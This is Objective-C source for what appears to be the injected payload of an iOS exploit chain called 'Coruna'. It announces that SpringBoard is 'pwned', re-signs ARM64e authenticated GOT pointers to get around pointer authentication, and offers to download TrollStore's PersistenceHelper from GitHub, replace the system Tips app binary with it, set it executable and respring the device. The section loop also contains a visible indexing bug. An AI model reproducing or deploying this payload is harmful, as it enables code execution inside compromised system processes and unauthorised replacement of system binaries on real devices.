@import Darwin;
@import MachO;
@import UIKit;

#define FIX_SELECTOR(sel) *(&@selector(sel)) = (SEL)sel_registerName(#sel)

static NSString *findTipsAppPath(void) {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *bundleBase = @"/var/containers/Bundle/Application";
    NSArray *uuids = [fm contentsOfDirectoryAtPath:bundleBase error:nil];
    for (NSString *uuid in uuids) {
        NSString *tipsApp = [[bundleBase stringByAppendingPathComponent:uuid] stringByAppendingPathComponent:@"Tips.app"];
        NSString *tipsBin = [tipsApp stringByAppendingPathComponent:@"Tips"];
        if ([fm fileExistsAtPath:tipsBin]) {
            return tipsApp;
        }
    }
    return nil;
}

static void showAlert(NSString *title, NSString *message) {
    UIAlertController *a = [UIAlertController alertControllerWithTitle:title message:message preferredStyle:UIAlertControllerStyleAlert];
    [a addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
    [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:a animated:YES completion:nil];
}

static void installTrollStoreHelper(void) {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        NSString *tipsAppPath = findTipsAppPath();
        if (!tipsAppPath) {
            dispatch_async(dispatch_get_main_queue(), ^{
                showAlert(@"Error", @"Could not find Tips.app in /var/containers/Bundle/Application/");
            });
            return;
        }

        NSString *tipsBin = [tipsAppPath stringByAppendingPathComponent:@"Tips"];
        NSString *tipsBak = [tipsAppPath stringByAppendingPathComponent:@"Tips.bak"];
        NSString *downloadURL = @"https://github.com/opa334/TrollStore/releases/download/2.1/PersistenceHelper_Embedded";
        NSString *tmpPath = @"/tmp/PersistenceHelper_Embedded";

        // Download PersistenceHelper_Embedded
        NSURLRequest *request = [NSURLRequest requestWithURL:[NSURL URLWithString:downloadURL]
                                                 cachePolicy:NSURLRequestReloadIgnoringLocalCacheData
                                             timeoutInterval:60];
        __block NSData *downloadedData = nil;
        __block NSError *downloadError = nil;
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);

        NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request
            completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
                downloadedData = data;
                downloadError = error;
                dispatch_semaphore_signal(sem);
            }];
        [task resume];
        dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);

        if (downloadError || !downloadedData || downloadedData.length == 0) {
            dispatch_async(dispatch_get_main_queue(), ^{
                showAlert(@"Error", [NSString stringWithFormat:@"Failed to download PersistenceHelper: %@",
                    downloadError ? downloadError.localizedDescription : @"Empty response"]);
            });
            return;
        }

        // Write to tmp first
        NSFileManager *fm = [NSFileManager defaultManager];
        [downloadedData writeToFile:tmpPath atomically:YES];

        // Backup Tips -> Tips.bak (only if Tips.bak doesn't already exist)
        if (![fm fileExistsAtPath:tipsBak]) {
            NSError *backupError = nil;
            [fm copyItemAtPath:tipsBin toPath:tipsBak error:&backupError];
            if (backupError) {
                dispatch_async(dispatch_get_main_queue(), ^{
                    showAlert(@"Error", [NSString stringWithFormat:@"Failed to backup Tips: %@", backupError.localizedDescription]);
                });
                return;
            }
        }

        // Replace Tips with PersistenceHelper_Embedded
        NSError *removeError = nil;
        [fm removeItemAtPath:tipsBin error:&removeError];
        NSError *moveError = nil;
        [fm moveItemAtPath:tmpPath toPath:tipsBin error:&moveError];
        if (moveError) {
            dispatch_async(dispatch_get_main_queue(), ^{
                showAlert(@"Error", [NSString stringWithFormat:@"Failed to replace Tips: %@", moveError.localizedDescription]);
            });
            return;
        }

        // Set executable permissions
        NSDictionary *attrs = @{NSFilePosixPermissions: @(0755)};
        [fm setAttributes:attrs ofItemAtPath:tipsBin error:nil];

        // Respring
        dispatch_async(dispatch_get_main_queue(), ^{
            showAlert(@"Success", @"TrollStore Helper installed! Device will respring now.");
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                exit(0);
            });
        });
    });
}

void payload_entry(void *arg) {
    dispatch_async(dispatch_get_main_queue(), ^{
        // fix selectors
        FIX_SELECTOR(alertControllerWithTitle:message:preferredStyle:);
        FIX_SELECTOR(addAction:);
        FIX_SELECTOR(actionWithTitle:style:handler:);
        FIX_SELECTOR(presentViewController:animated:completion:);
        FIX_SELECTOR(sharedApplication);
        FIX_SELECTOR(keyWindow);
        FIX_SELECTOR(rootViewController);
        FIX_SELECTOR(defaultManager);
        FIX_SELECTOR(contentsOfDirectoryAtPath:error:);
        FIX_SELECTOR(fileExistsAtPath:);
        FIX_SELECTOR(stringByAppendingPathComponent:);
        FIX_SELECTOR(copyItemAtPath:toPath:error:);
        FIX_SELECTOR(removeItemAtPath:error:);
        FIX_SELECTOR(moveItemAtPath:toPath:error:);
        FIX_SELECTOR(setAttributes:ofItemAtPath:error:);
        FIX_SELECTOR(writeToFile:atomically:);
        FIX_SELECTOR(sharedSession);
        FIX_SELECTOR(dataTaskWithRequest:completionHandler:);
        FIX_SELECTOR(resume);
        FIX_SELECTOR(requestWithURL:cachePolicy:timeoutInterval:);
        FIX_SELECTOR(localizedDescription);
        FIX_SELECTOR(length);

        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Coruna" message:@"SpringBoard is pwned." preferredStyle:UIAlertControllerStyleAlert];
        [alert addAction:[UIAlertAction actionWithTitle:@"Install TrollStore Helper" style:UIAlertActionStyleDefault handler:^(id action){
            installTrollStoreHelper();
        }]];
        [alert addAction:[UIAlertAction actionWithTitle:@"Respring" style:UIAlertActionStyleDefault handler:^(id action){
            exit(0);
        }]];
        [alert addAction:[UIAlertAction actionWithTitle:@"Cancel" style:UIAlertActionStyleDefault handler:nil]];
        [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:alert animated:YES completion:nil];
    });

    // infinite loop
    CFRunLoopRun();
}

// opainject: set TLS to main thread
void _pthread_set_self(pthread_t p);
pthread_t pthread_main_thread_np(void);

__attribute__((noinline))
void *pacia(void* ptr, uint64_t ctx) {
#if __arm64e__
    __asm__("xpaci %[value]\n" : [value] "+r"(ptr));
    __asm__("pacia %0, %1" : "+r"(ptr) : "r"(ctx));
#endif
    return ptr;
}

#if __arm64e__
#include <mach-o/loader.h>
#include <mach-o/dyld.h>
#include <mach-o/dyld_images.h>
#include <ptrauth.h>
#include <mach/mach.h>
#include <mach-o/ldsyms.h>

// Fixup chain pointer format for ARM64E authenticated pointers
typedef struct {
    uint64_t target   : 32;  // runtimeOffset from image base
    uint64_t high8    : 8;
    uint64_t diversity: 16;  // per-location discriminator
    uint64_t addrDiv  : 1;   // address diversity flag
    uint64_t key      : 2;   // ptrauth key (IA=0 IB=1 DA=2 DB=3)
    uint64_t next     : 4;
    uint64_t bind     : 1;   // 0=rebase 1=bind
    uint64_t auth     : 1;   // must be 1
} dyld_chained_ptr_arm64e_auth_rebase;

void resign_auth_got(const struct mach_header_64 *targetHeader) {
    size_t (*pac_strlcpy)(char *dst, const char *src, size_t size) = pacia(strlcpy, 0);
    int (*pac_strncmp)(const char *s1, const char *s2, size_t n) = pacia(strncmp, 0);
    int (*pac_strcmp)(const char *s1, const char *s2) = pacia(strcmp, 0);
    uint8_t *(*pac_getsectiondata)(const struct mach_header_64 *mh, const char *segname, const char *sectname, unsigned long *size) = pacia(getsectiondata, 0);
    kern_return_t (*pac_vm_protect)(vm_map_t target_task, vm_address_t address, vm_size_t size, boolean_t set_maximum, vm_prot_t new_protection) = pacia(vm_protect, 0);
    int (*pac_fsync)(int fd) = pacia(fsync, 0);
    int (*pac_close)(int fd) = pacia(close, 0);
    int (*pac_sleep)(unsigned int seconds) = pacia(sleep, 0);
    
    int (*pac_open)(const char *path, int oflag, ...) = pacia(open, 0);
    void (*pac_dprintf)(int fd, const char *format, ...) = pacia(dprintf, 0);
    int fd = pac_open("/tmp/resign.log", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    
    assert(targetHeader->magic == MH_MAGIC_64);
    uintptr_t base = (uintptr_t)targetHeader;

    // Walk load commands to find __AUTH_GOT or __DATA_CONST.__auth_got
    struct load_command *lcp = (void *)((uintptr_t)targetHeader + sizeof(struct mach_header_64));
    for(int i = 0; i < targetHeader->ncmds; i++, lcp = (void *)((uintptr_t)lcp + lcp->cmdsize)) {
        if (lcp->cmd != LC_SEGMENT_64) continue;
        struct segment_command_64 *segCmd = (struct segment_command_64 *)lcp;
        if (pac_strncmp(segCmd->segname, "__AUTH_CONST", sizeof(segCmd->segname)) &&
            pac_strncmp(segCmd->segname, "__DATA_CONST", sizeof(segCmd->segname)) &&
            pac_strncmp(segCmd->segname, "__DATA", sizeof(segCmd->segname))) continue;
        
        struct section_64 *sections = (void *)((uintptr_t)lcp + sizeof(struct segment_command_64));
        for (int j = 0; j < segCmd->nsects; j++) {
            struct section_64 *section = &sections[i];
            if ((section->flags & SECTION_TYPE) != S_LAZY_SYMBOL_POINTERS &&
                (section->flags & SECTION_TYPE) != S_NON_LAZY_SYMBOL_POINTERS) continue;
            pac_dprintf(fd, "Found section: %s\n", section->sectname);
            
            char segname[sizeof(section->segname)+1];
            pac_strlcpy(segname, section->segname, sizeof(segname));
            char sectname[sizeof(section->sectname)+1];
            pac_strlcpy(sectname, section->sectname, sizeof(sectname));
            pac_dprintf(fd, "Processing section: %s.%s\n", segname, sectname);
            if (pac_strcmp(sectname, "__auth_got")) continue;
            
            unsigned long sectionSize = 0;
            uint8_t *sectionStart = pac_getsectiondata(targetHeader, segname, sectname, &sectionSize);
            pac_vm_protect(mach_task_self(), (vm_address_t)sectionStart, sectionSize, false, VM_PROT_READ | VM_PROT_WRITE);
            void **symbolPointers = (void **)sectionStart;
            for (uint32_t i = 0; i < (sectionSize / sizeof(void *)); i++) {
                void *symbolPointer = symbolPointers[i];
                if (!symbolPointer) continue;
                pac_dprintf(fd, "Original pointer at index %u: %p\n", i, symbolPointer);
                symbolPointers[i] = ptrauth_sign_unauthenticated(symbolPointers[i], ptrauth_key_process_independent_code, 0);
            }
        }
    }
    
    pac_dprintf(fd, "Done processing\n");
    pac_fsync(fd);
    pac_close(fd);
    
//    
//    struct load_command *lc = (void*)(base + sizeof(struct mach_header_64));
//    for (uint32_t i = 0; i < mh->ncmds; i++, lc = (void*)((uint8_t*)lc + lc->cmdsize)) {
//        if (lc->cmd != LC_SEGMENT_64) continue;
//        struct segment_command_64 *seg = (void*)lc;
//        
//        if (strncmp(segCmd->segname, "__AUTH_CONST", sizeof(segCmd->segname)) &&
//            strncmp(segCmd->segname, "__DATA_CONST", sizeof(segCmd->segname)) &&                strncmp(segCmd->segname, "__DATA", sizeof(segCmd->segname)) continue;
//            
//        struct section_64 *sect = (void*)(seg + 1);
//        for (uint32_t j = 0; j < seg->nsects; j++, sect++) {
//            
//            uint64_t *slot = (uint64_t*)(base + sect->addr); // vm addr relative to base
//            // use sect->offset if file-offset needed, but post-load use vmaddr
//            slot = (uint64_t*)(sect->addr + (uintptr_t)base - (uintptr_t)mh->reserved /* ASLR slide handled below */);
//
//            size_t count = sect->size / sizeof(uint64_t);
//            for (size_t k = 0; k < count; k++) {
//                uint64_t raw = slot[k];
//
//                // Check if this is still an unresolved auth chain entry
//                // auth bit = bit 63, bind bit = bit 62
//                if (!(raw >> 63 & 1)) continue; // not an auth ptr, skip
//
//                dyld_chained_ptr_arm64e_auth_rebase *chain =
//                    (dyld_chained_ptr_arm64e_auth_rebase*)&raw;
//
//                if (chain->auth != 1) continue;
//
//                // Resolve target address
//                uintptr_t target = base + chain->target;
//
//                // Build discriminator
//                uint64_t disc = chain->diversity;
//                if (chain->addrDiv) {
//                    disc = ptrauth_blend_discriminator(&slot[k], disc);
//                }
//
//                // Sign with correct key
//                void *signed_ptr;
//                switch (chain->key) {
//                    case 0: signed_ptr = ptrauth_sign_unauthenticated((void*)target, ptrauth_key_asia, disc); break;
//                    case 1: signed_ptr = ptrauth_sign_unauthenticated((void*)target, ptrauth_key_asib, disc); break;
//                    case 2: signed_ptr = ptrauth_sign_unauthenticated((void*)target, ptrauth_key_asda, disc); break;
//                    case 3: signed_ptr = ptrauth_sign_unauthenticated((void*)target, ptrauth_key_asdb, disc); break;
//                }
//
//                signed_ptr = (void *)0x4141414141414141; // for testing, overwrite with invalid pointer to verify fixup works
//                
//                // Write back — need __DATA_CONST to be writable first
//                vm_protect(mach_task_self(), (vm_address_t)&slot[k],
//                           sizeof(uint64_t), false, VM_PROT_READ | VM_PROT_WRITE);
//                slot[k] = (uint64_t)signed_ptr;
//                vm_protect(mach_task_self(), (vm_address_t)&slot[k],
//                           sizeof(uint64_t), false, VM_PROT_READ);
//            }
//        }
//    }
}
#endif

extern const struct mach_header_64 _mh_dylib_header;
int last(void) {
#if __arm64e__
    pthread_t (*pac_pthread_main_thread_np)(void) = pacia(pthread_main_thread_np, 0);
    void (*pac__pthread_set_self)(pthread_t) = pacia(_pthread_set_self, 0);
    pac__pthread_set_self(pac_pthread_main_thread_np());
    resign_auth_got(&_mh_dylib_header);
#else
    _pthread_set_self(pthread_main_thread_np());
#endif
    
    // create another thread to run the real payload
    pthread_t self;
    pthread_create(&self, NULL, (void *)payload_entry, NULL);
    pthread_join(self, NULL);
    
    // should not return
    thread_terminate(mach_thread_self());
    return 0;
}

int end(void) {
    // should not return
    thread_terminate(mach_thread_self());
    return 0;
}
